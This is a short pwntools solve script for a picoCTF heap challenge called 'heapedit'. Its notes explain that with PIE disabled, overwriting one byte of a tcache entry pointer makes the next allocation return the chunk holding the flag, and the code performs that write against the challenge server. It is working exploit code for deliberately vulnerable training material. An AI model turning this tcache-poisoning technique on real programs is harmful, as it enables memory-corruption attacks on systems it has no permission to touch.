'''
tags: `heap`, `tcache`

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'

-> No PIE
->-> all address get in local is the same as address of remote

**tcache**
`malloc` same size after `free`s
-> get the chunk in tcache

target
change the first chunk in `tcache` by modifying the pointer of the `tcache_entry` to the one pointer to **flag**
'''
from pwn import *

host = 'mercury.picoctf.net'
port = 34499

elf = ELF('./heapedit')
libc = ELF('./libc.so.6')

def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(host, port)
    return r

def solve(r):
    tcache_entry = 0x602088
    edit_base = 0x6034a0

    # edit tcache_entry from 0x603890 to 0x604800
    # -> write b'\x00' to 0x602088
    changed_value = b'\x00'

    r.recvuntil(b'Address: ')
    r.sendline(str(tcache_entry - edit_base).encode())
    r.recvuntil(b'Value: ')
    r.sendline(changed_value)
    r.recvuntil(b': ')
    print (r.recvline()[:-1])

if __name__ == '__main__':
    r = conn()
    solve(r)
    r.close()